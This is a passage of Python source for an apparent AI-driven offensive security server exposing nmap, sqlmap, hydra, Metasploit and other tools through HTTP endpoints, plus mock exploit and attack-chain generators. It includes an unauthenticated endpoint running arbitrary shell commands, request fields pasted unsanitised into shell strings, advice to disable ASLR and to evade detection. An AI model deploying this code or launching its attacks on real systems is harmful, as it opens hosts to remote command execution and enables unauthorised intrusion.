    def _generate_usage_instructions(self, vuln_type, params):
        """Generate usage instructions for the exploit"""
        instructions = [
            f"# Exploit for CVE {params['cve_id']}",
            f"# Vulnerability Type: {vuln_type}",
            "",
            "## Usage Instructions:",
            "1. Ensure target is vulnerable to this CVE",
            "2. Adjust target parameters as needed",
            "3. Test in controlled environment first",
            "4. Execute with appropriate permissions",
            "",
            "## Testing:",
            f"python3 exploit.py {params.get('target_ip', '')} {params.get('target_port', '')}"
        ]
        
        if vuln_type == "buffer_overflow":
            instructions.extend([
                "",
                "## Buffer Overflow Notes:",
                f"- Offset: {params.get('offset', 'Unknown')}",
                f"- Return address: {params.get('ret_address', 'Unknown')}",
                "- Verify addresses match target binary",
                "- Disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space"
            ])
        
        return "\n".join(instructions)

class VulnerabilityCorrelator:
    """Correlate vulnerabilities for multi-stage attack chain discovery"""
    
    def __init__(self):
        self.attack_patterns = {
            "privilege_escalation": ["local", "kernel", "suid", "sudo"],
            "remote_execution": ["remote", "network", "rce", "code execution"],
            "persistence": ["service", "registry", "scheduled", "startup"],
            "lateral_movement": ["smb", "wmi", "ssh", "rdp"],
            "data_exfiltration": ["file", "database", "memory", "network"]
        }
        
        self.software_relationships = {
            "windows": ["iis", "office", "exchange", "sharepoint"],
            "linux": ["apache", "nginx", "mysql", "postgresql"],
            "web": ["php", "nodejs", "python", "java"],
            "database": ["mysql", "postgresql", "oracle", "mssql"]
        }
    
    def find_attack_chains(self, target_software, max_depth=3):
        """Find multi-vulnerability attack chains"""
        try:
            # This is a simplified implementation
            # Real version would use graph algorithms and ML
            
            chains = []
            
            # Example attack chain discovery logic
            base_software = target_software.lower()
            
            # Find initial access vulnerabilities
            initial_vulns = self._find_vulnerabilities_by_pattern(base_software, "remote_execution")
            
            for initial_vuln in initial_vulns[:3]:  # Limit for demo
                chain = {
                    "chain_id": f"chain_{len(chains) + 1}",
                    "target": target_software,
                    "stages": [
                        {
                            "stage": 1,
                            "objective": "Initial Access",
                            "vulnerability": initial_vuln,
                            "success_probability": 0.75
                        }
                    ],
                    "overall_probability": 0.75,
                    "complexity": "MEDIUM"
                }
                
                # Find privilege escalation
                priv_esc_vulns = self._find_vulnerabilities_by_pattern(base_software, "privilege_escalation")
                if priv_esc_vulns:
                    chain["stages"].append({
                        "stage": 2,
                        "objective": "Privilege Escalation",
                        "vulnerability": priv_esc_vulns[0],
                        "success_probability": 0.60
                    })
                    chain["overall_probability"] *= 0.60
                
                # Find persistence
                persistence_vulns = self._find_vulnerabilities_by_pattern(base_software, "persistence")
                if persistence_vulns and len(chain["stages"]) < max_depth:
                    chain["stages"].append({
                        "stage": 3,
                        "objective": "Persistence",
                        "vulnerability": persistence_vulns[0],
                        "success_probability": 0.80
                    })
                    chain["overall_probability"] *= 0.80
                
                chains.append(chain)
            
            return {
                "success": True,
                "target_software": target_software,
                "total_chains": len(chains),
                "attack_chains": chains,
                "recommendation": self._generate_chain_recommendations(chains)
            }
            
        except Exception as e:
            logger.error(f"Error finding attack chains: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _find_vulnerabilities_by_pattern(self, software, pattern_type):
        """Find vulnerabilities matching attack pattern"""
        # Simplified mock data - real implementation would query CVE database
        mock_vulnerabilities = [
            {
                "cve_id": "CVE-2024-1234",
                "description": f"Remote code execution in {software}",
                "cvss_score": 9.8,
                "exploitability": "HIGH"
            },
            {
                "cve_id": "CVE-2024-5678",
                "description": f"Privilege escalation in {software}",
                "cvss_score": 7.8,
                "exploitability": "MEDIUM"
            }
        ]
        
        return mock_vulnerabilities
    
    def _generate_chain_recommendations(self, chains):
        """Generate recommendations for attack chains"""
        if not chains:
            return "No viable attack chains found for target"
        
        recommendations = [
            f"Found {len(chains)} potential attack chains",
            f"Highest probability chain: {max(chains, key=lambda x: x['overall_probability'])['overall_probability']:.2%}",
            "Recommendations:",
            "- Test chains in order of probability",
            "- Prepare fallback methods for each stage",
            "- Consider detection evasion at each stage"
        ]
        
        return "\n".join(recommendations)

# Global intelligence managers
cve_intelligence = CVEIntelligenceManager()
exploit_generator = AIExploitGenerator()
vulnerability_correlator = VulnerabilityCorrelator()

def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
    """
    Execute a shell command with enhanced features
    
    Args:
        command: The command to execute
        use_cache: Whether to use caching for this command
        
    Returns:
        A dictionary containing the stdout, stderr, return code, and metadata
    """
    
    # Check cache first
    if use_cache:
        cached_result = cache.get(command, {})
        if cached_result:
            return cached_result
    
    # Execute command
    executor = EnhancedCommandExecutor(command)
    result = executor.execute()
    
    # Cache successful results
    if use_cache and result.get("success", False):
        cache.set(command, {}, result)
    
    return result

# File Operations Manager
class FileOperationsManager:
    """Handle file operations with security and validation"""
    
    def __init__(self, base_dir: str = "/tmp/hexstrike_files"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)
        self.max_file_size = 100 * 1024 * 1024  # 100MB
    
    def create_file(self, filename: str, content: str, binary: bool = False) -> Dict[str, Any]:
        """Create a file with the specified content"""
        try:
            file_path = self.base_dir / filename
            file_path.parent.mkdir(parents=True, exist_ok=True)
            
            if len(content.encode()) > self.max_file_size:
                return {"success": False, "error": f"File size exceeds {self.max_file_size} bytes"}
            
            mode = "wb" if binary else "w"
            with open(file_path, mode) as f:
                if binary:
                    f.write(content.encode() if isinstance(content, str) else content)
                else:
                    f.write(content)
            
            logger.info(f"📄 Created file: {filename} ({len(content)} bytes)")
            return {"success": True, "path": str(file_path), "size": len(content)}
            
        except Exception as e:
            logger.error(f"❌ Error creating file {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def modify_file(self, filename: str, content: str, append: bool = False) -> Dict[str, Any]:
        """Modify an existing file"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}
            
            mode = "a" if append else "w"
            with open(file_path, mode) as f:
                f.write(content)
            
            logger.info(f"✏️  Modified file: {filename}")
            return {"success": True, "path": str(file_path)}
            
        except Exception as e:
            logger.error(f"❌ Error modifying file {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def delete_file(self, filename: str) -> Dict[str, Any]:
        """Delete a file or directory"""
        try:
            file_path = self.base_dir / filename
            if not file_path.exists():
                return {"success": False, "error": "File does not exist"}
            
            if file_path.is_dir():
                shutil.rmtree(file_path)
            else:
                file_path.unlink()
            
            logger.info(f"🗑️  Deleted: {filename}")
            return {"success": True}
            
        except Exception as e:
            logger.error(f"❌ Error deleting {filename}: {e}")
            return {"success": False, "error": str(e)}
    
    def list_files(self, directory: str = ".") -> Dict[str, Any]:
        """List files in a directory"""
        try:
            dir_path = self.base_dir / directory
            if not dir_path.exists():
                return {"success": False, "error": "Directory does not exist"}
            
            files = []
            for item in dir_path.iterdir():
                files.append({
                    "name": item.name,
                    "type": "directory" if item.is_dir() else "file",
                    "size": item.stat().st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(item.stat().st_mtime).isoformat()
                })
            
            return {"success": True, "files": files}
            
        except Exception as e:
            logger.error(f"❌ Error listing files in {directory}: {e}")
            return {"success": False, "error": str(e)}

# Global file operations manager
file_manager = FileOperationsManager()

# API Routes

@app.route("/health", methods=["GET"])
def health_check():
    """Enhanced health check endpoint with telemetry"""
    essential_tools = ["nmap", "gobuster", "dirb", "nikto", "sqlmap", "hydra", "john"]
    cloud_tools = ["prowler", "scout2", "trivy", "kube-hunter", "cloudsploit"]
    advanced_tools = [
        "ffuf", "nuclei", "nxc", "amass", "hashcat", "subfinder", 
        "smbmap", "volatility", "msfvenom", "msfconsole", "enum4linux", "wpscan",
        "burpsuite", "zaproxy"
    ]
    
    all_tools = essential_tools + cloud_tools + advanced_tools
    tools_status = {}
    
    for tool in all_tools:
        try:
            result = execute_command(f"which {tool}", use_cache=True)
            tools_status[tool] = result["success"]
        except:
            tools_status[tool] = False
    
    all_essential_tools_available = all(tools_status[tool] for tool in essential_tools)
    
    return jsonify({
        "status": "healthy",
        "message": "HexStrike AI Tools API Server is operational",
        "version": "5.0.0",
        "tools_status": tools_status,
        "all_essential_tools_available": all_essential_tools_available,
        "total_tools_available": sum(1 for tool, available in tools_status.items() if available),
        "total_tools_count": len(all_tools),
        "cache_stats": cache.get_stats(),
        "telemetry": telemetry.get_stats(),
        "uptime": time.time() - telemetry.stats["start_time"]
    })

@app.route("/api/command", methods=["POST"])
def generic_command():
    """Execute any command provided in the request with enhanced logging"""
    try:
        params = request.json
        command = params.get("command", "")
        use_cache = params.get("use_cache", True)
        
        if not command:
            logger.warning("⚠️  Command endpoint called without command parameter")
            return jsonify({
                "error": "Command parameter is required"
            }), 400
        
        result = execute_command(command, use_cache=use_cache)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in command endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# File Operations API Endpoints

@app.route("/api/files/create", methods=["POST"])
def create_file():
    """Create a new file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        binary = params.get("binary", False)
        
        if not filename:
            return jsonify({"error": "Filename is required"}), 400
        
        result = file_manager.create_file(filename, content, binary)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error creating file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/modify", methods=["POST"])
def modify_file():
    """Modify an existing file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        append = params.get("append", False)
        
        if not filename:
            return jsonify({"error": "Filename is required"}), 400
        
        result = file_manager.modify_file(filename, content, append)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error modifying file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/delete", methods=["DELETE"])
def delete_file():
    """Delete a file or directory"""
    try:
        params = request.json
        filename = params.get("filename", "")
        
        if not filename:
            return jsonify({"error": "Filename is required"}), 400
        
        result = file_manager.delete_file(filename)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error deleting file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/list", methods=["GET"])
def list_files():
    """List files in a directory"""
    try:
        directory = request.args.get("directory", ".")
        result = file_manager.list_files(directory)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error listing files: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Payload Generation Endpoint
@app.route("/api/payloads/generate", methods=["POST"])
def generate_payload():
    """Generate large payloads for testing"""
    try:
        params = request.json
        payload_type = params.get("type", "buffer")
        size = params.get("size", 1024)
        pattern = params.get("pattern", "A")
        filename = params.get("filename", f"payload_{int(time.time())}")
        
        if size > 100 * 1024 * 1024:  # 100MB limit
            return jsonify({"error": "Payload size too large (max 100MB)"}), 400
        
        if payload_type == "buffer":
            content = pattern * (size // len(pattern))
        elif payload_type == "cyclic":
            # Generate cyclic pattern
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            content = ""
            for i in range(size):
                content += alphabet[i % len(alphabet)]
        elif payload_type == "random":
            import random
            import string
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
        else:
            return jsonify({"error": "Invalid payload type"}), 400
        
        result = file_manager.create_file(filename, content)
        result["payload_info"] = {
            "type": payload_type,
            "size": size,
            "pattern": pattern
        }
        
        logger.info(f"🎯 Generated {payload_type} payload: {filename} ({size} bytes)")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error generating payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Cache Management Endpoint
@app.route("/api/cache/stats", methods=["GET"])
def cache_stats():
    """Get cache statistics"""
    return jsonify(cache.get_stats())

@app.route("/api/cache/clear", methods=["POST"])
def clear_cache():
    """Clear the cache"""
    cache.cache.clear()
    cache.stats = {"hits": 0, "misses": 0, "evictions": 0}
    logger.info("🧹 Cache cleared")
    return jsonify({"success": True, "message": "Cache cleared"})

# Telemetry Endpoint
@app.route("/api/telemetry", methods=["GET"])
def get_telemetry():
    """Get system telemetry"""
    return jsonify(telemetry.get_stats())

# ============================================================================
# PROCESS MANAGEMENT API ENDPOINTS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/processes/list", methods=["GET"])
def list_processes():
    """List all active processes"""
    try:
        processes = ProcessManager.list_active_processes()
        
        # Add calculated fields for each process
        for pid, info in processes.items():
            runtime = time.time() - info["start_time"]
            info["runtime_formatted"] = f"{runtime:.1f}s"
            
            if info["progress"] > 0:
                eta = (runtime / info["progress"]) * (1.0 - info["progress"])
                info["eta_formatted"] = f"{eta:.1f}s"
            else:
                info["eta_formatted"] = "Unknown"
        
        return jsonify({
            "success": True,
            "active_processes": processes,
            "total_count": len(processes)
        })
    except Exception as e:
        logger.error(f"💥 Error listing processes: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/status/<int:pid>", methods=["GET"])
def get_process_status(pid):
    """Get status of a specific process"""
    try:
        process_info = ProcessManager.get_process_status(pid)
        
        if process_info:
            # Add calculated fields
            runtime = time.time() - process_info["start_time"]
            process_info["runtime_formatted"] = f"{runtime:.1f}s"
            
            if process_info["progress"] > 0:
                eta = (runtime / process_info["progress"]) * (1.0 - process_info["progress"])
                process_info["eta_formatted"] = f"{eta:.1f}s"
            else:
                process_info["eta_formatted"] = "Unknown"
            
            return jsonify({
                "success": True,
                "process": process_info
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Process {pid} not found"
            }), 404
            
    except Exception as e:
        logger.error(f"💥 Error getting process status: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/terminate/<int:pid>", methods=["POST"])
def terminate_process(pid):
    """Terminate a specific process"""
    try:
        success = ProcessManager.terminate_process(pid)
        
        if success:
            logger.info(f"🛑 Process {pid} terminated successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} terminated successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to terminate process {pid} or process not found"
            }), 404
            
    except Exception as e:
        logger.error(f"💥 Error terminating process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/pause/<int:pid>", methods=["POST"])
def pause_process(pid):
    """Pause a specific process"""
    try:
        success = ProcessManager.pause_process(pid)
        
        if success:
            logger.info(f"⏸️ Process {pid} paused successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} paused successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to pause process {pid} or process not found"
            }), 404
            
    except Exception as e:
        logger.error(f"💥 Error pausing process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/resume/<int:pid>", methods=["POST"])
def resume_process(pid):
    """Resume a paused process"""
    try:
        success = ProcessManager.resume_process(pid)
        
        if success:
            logger.info(f"▶️ Process {pid} resumed successfully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} resumed successfully"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to resume process {pid} or process not found"
            }), 404
            
    except Exception as e:
        logger.error(f"💥 Error resuming process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/processes/dashboard", methods=["GET"])
def process_dashboard():
    """Get enhanced process dashboard with visual status"""
    try:
        processes = ProcessManager.list_active_processes()
        current_time = time.time()
        
        dashboard = {
            "timestamp": datetime.now().isoformat(),
            "total_processes": len(processes),
            "processes": [],
            "system_load": {
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "active_connections": len(psutil.net_connections())
            }
        }
        
        for pid, info in processes.items():
            runtime = current_time - info["start_time"]
            progress_percent = info.get("progress", 0) * 100
            
            # Create visual progress bar
            bar_length = 20
            filled_length = int(bar_length * progress_percent / 100)
            progress_bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            # Calculate ETA
            if progress_percent > 5:
                eta = ((runtime / progress_percent) * 100) - runtime
                eta_str = f"{eta:.0f}s"
            else:
                eta_str = "Calculating..."
            
            process_status = {
                "pid": pid,
                "command": info["command"][:60] + "..." if len(info["command"]) > 60 else info["command"],
                "status": info["status"],
                "runtime": f"{runtime:.1f}s",
                "progress_percent": f"{progress_percent:.1f}%",
                "progress_bar": progress_bar,
                "eta": eta_str,
                "bytes_processed": info.get("bytes_processed", 0),
                "last_output": info.get("last_output", "")[:100]
            }
            dashboard["processes"].append(process_status)
        
        return jsonify(dashboard)
        
    except Exception as e:
        logger.error(f"💥 Error getting process dashboard: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# SECURITY TOOLS API ENDPOINTS
# ============================================================================

@app.route("/api/tools/nmap", methods=["POST"])
def nmap():
    """Execute nmap scan with enhanced logging and caching"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sCV")
        ports = params.get("ports", "")
        additional_args = params.get("additional_args", "-T4 -Pn")
        
        if not target:
            logger.warning("🎯 Nmap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"nmap {scan_type}"
        
        if ports:
            command += f" -p {ports}"
        
        if additional_args:
            command += f" {additional_args}"
        
        command += f" {target}"
        
        logger.info(f"🔍 Starting Nmap scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Nmap scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/gobuster", methods=["POST"])
def gobuster():
    """Execute gobuster with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        mode = params.get("mode", "dir")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 Gobuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        # Validate mode
        if mode not in ["dir", "dns", "fuzz", "vhost"]:
            logger.warning(f"❌ Invalid gobuster mode: {mode}")
            return jsonify({
                "error": f"Invalid mode: {mode}. Must be one of: dir, dns, fuzz, vhost"
            }), 400
        
        command = f"gobuster {mode} -u {url} -w {wordlist}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"📁 Starting Gobuster {mode} scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Gobuster scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gobuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nuclei", methods=["POST"])
def nuclei():
    """Execute Nuclei vulnerability scanner with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        severity = params.get("severity", "")
        tags = params.get("tags", "")
        template = params.get("template", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 Nuclei called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"nuclei -u {target}"
        
        if severity:
            command += f" -severity {severity}"
            
        if tags:
            command += f" -tags {tags}"
            
        if template:
            command += f" -t {template}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔬 Starting Nuclei vulnerability scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Nuclei scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nuclei endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# CLOUD SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/prowler", methods=["POST"])
def prowler():
    """Execute Prowler for AWS security assessment"""
    try:
        params = request.json
        provider = params.get("provider", "aws")
        profile = params.get("profile", "default")
        region = params.get("region", "")
        checks = params.get("checks", "")
        output_dir = params.get("output_dir", "/tmp/prowler_output")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")
        
        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        command = f"prowler {provider}"
        
        if profile:
            command += f" --profile {profile}"
            
        if region:
            command += f" --region {region}"
            
        if checks:
            command += f" --checks {checks}"
            
        command += f" --output-directory {output_dir}"
        command += f" --output-format {output_format}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"☁️  Starting Prowler {provider} security assessment")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Prowler assessment completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in prowler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/trivy", methods=["POST"])
def trivy():
    """Execute Trivy for container/filesystem vulnerability scanning"""
    try:
        params = request.json
        scan_type = params.get("scan_type", "image")  # image, fs, repo
        target = params.get("target", "")
        output_format = params.get("output_format", "json")
        severity = params.get("severity", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 Trivy called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"trivy {scan_type} {target}"
        
        if output_format:
            command += f" --format {output_format}"
            
        if severity:
            command += f" --severity {severity}"
            
        if output_file:
            command += f" --output {output_file}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Trivy {scan_type} scan: {target}")
        result = execute_command(command)
        if output_file:
            result["output_file"] = output_file
        logger.info(f"📊 Trivy scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in trivy endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dirb", methods=["POST"])
def dirb():
    """Execute dirb with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 Dirb called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"dirb {url} {wordlist}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"📁 Starting Dirb scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Dirb scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dirb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nikto", methods=["POST"])
def nikto():
    """Execute nikto with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 Nikto called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"nikto -h {target}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔬 Starting Nikto scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Nikto scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nikto endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/sqlmap", methods=["POST"])
def sqlmap():
    """Execute sqlmap with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        data = params.get("data", "")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🎯 SQLMap called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"sqlmap -u {url} --batch"
        
        if data:
            command += f" --data=\"{data}\""
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"💉 Starting SQLMap scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 SQLMap scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in sqlmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/metasploit", methods=["POST"])
def metasploit():
    """Execute metasploit module with enhanced logging"""
    try:
        params = request.json
        module = params.get("module", "")
        options = params.get("options", {})
        
        if not module:
            logger.warning("🚀 Metasploit called without module parameter")
            return jsonify({
                "error": "Module parameter is required"
            }), 400
        
        # Create an MSF resource script
        resource_content = f"use {module}\n"
        for key, value in options.items():
            resource_content += f"set {key} {value}\n"
        resource_content += "exploit\n"
        
        # Save resource script to a temporary file
        resource_file = "/tmp/mcp_msf_resource.rc"
        with open(resource_file, "w") as f:
            f.write(resource_content)
        
        command = f"msfconsole -q -r {resource_file}"
        
        logger.info(f"🚀 Starting Metasploit module: {module}")
        result = execute_command(command)
        
        # Clean up the temporary file
        try:
            os.remove(resource_file)
        except Exception as e:
            logger.warning(f"Error removing temporary resource file: {str(e)}")
        
        logger.info(f"📊 Metasploit module completed: {module}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in metasploit endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hydra", methods=["POST"])
def hydra():
    """Execute hydra with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        service = params.get("service", "")
        username = params.get("username", "")
        username_file = params.get("username_file", "")
        password = params.get("password", "")
        password_file = params.get("password_file", "")
        additional_args = params.get("additional_args", "")
        
        if not target or not service:
            logger.warning("🎯 Hydra called without target or service parameter")
            return jsonify({
                "error": "Target and service parameters are required"
            }), 400
        
        if not (username or username_file) or not (password or password_file):
            logger.warning("🔑 Hydra called without username/password parameters")
            return jsonify({
                "error": "Username/username_file and password/password_file are required"
            }), 400
        
        command = f"hydra -t 4"
        
        if username:
            command += f" -l {username}"
        elif username_file:
            command += f" -L {username_file}"
        
        if password:
            command += f" -p {password}"
        elif password_file:
            command += f" -P {password_file}"
        
        if additional_args:
            command += f" {additional_args}"
        
        command += f" {target} {service}"
        
        logger.info(f"🔑 Starting Hydra attack: {target}:{service}")
        result = execute_command(command)
        logger.info(f"📊 Hydra attack completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hydra endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/john", methods=["POST"])
def john():
    """Execute john with enhanced logging"""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        format_type = params.get("format", "")
        additional_args = params.get("additional_args", "")
        
        if not hash_file:
            logger.warning("🔐 John called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400
        
        command = f"john"
        
        if format_type:
            command += f" --format={format_type}"
        
        if wordlist:
            command += f" --wordlist={wordlist}"
        
        if additional_args:
            command += f" {additional_args}"
        
        command += f" {hash_file}"
        
        logger.info(f"🔐 Starting John the Ripper: {hash_file}")
        result = execute_command(command)
        logger.info(f"📊 John the Ripper completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in john endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wpscan", methods=["POST"])
def wpscan():
    """Execute wpscan with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 WPScan called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"wpscan --url {url}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting WPScan: {url}")
        result = execute_command(command)
        logger.info(f"📊 WPScan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wpscan endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/enum4linux", methods=["POST"])
def enum4linux():
    """Execute enum4linux with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "-a")
        
        if not target:
            logger.warning("🎯 Enum4linux called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"enum4linux {additional_args} {target}"
        
        logger.info(f"🔍 Starting Enum4linux: {target}")
        result = execute_command(command)
        logger.info(f"📊 Enum4linux completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in enum4linux endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ffuf", methods=["POST"])
def ffuf():
    """Execute FFuf web fuzzer with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        mode = params.get("mode", "directory")
        match_codes = params.get("match_codes", "200,204,301,302,307,401,403")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 FFuf called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"ffuf"
        
        if mode == "directory":
            command += f" -u {url}/FUZZ -w {wordlist}"
        elif mode == "vhost":
            command += f" -u {url} -H 'Host: FUZZ' -w {wordlist}"
        elif mode == "parameter":
            command += f" -u {url}?FUZZ=value -w {wordlist}"
        else:
            command += f" -u {url} -w {wordlist}"
            
        command += f" -mc {match_codes}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting FFuf {mode} fuzzing: {url}")
        result = execute_command(command)
        logger.info(f"📊 FFuf fuzzing completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ffuf endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/netexec", methods=["POST"])
def netexec():
    """Execute NetExec (formerly CrackMapExec) with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        protocol = params.get("protocol", "smb")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_value = params.get("hash", "")
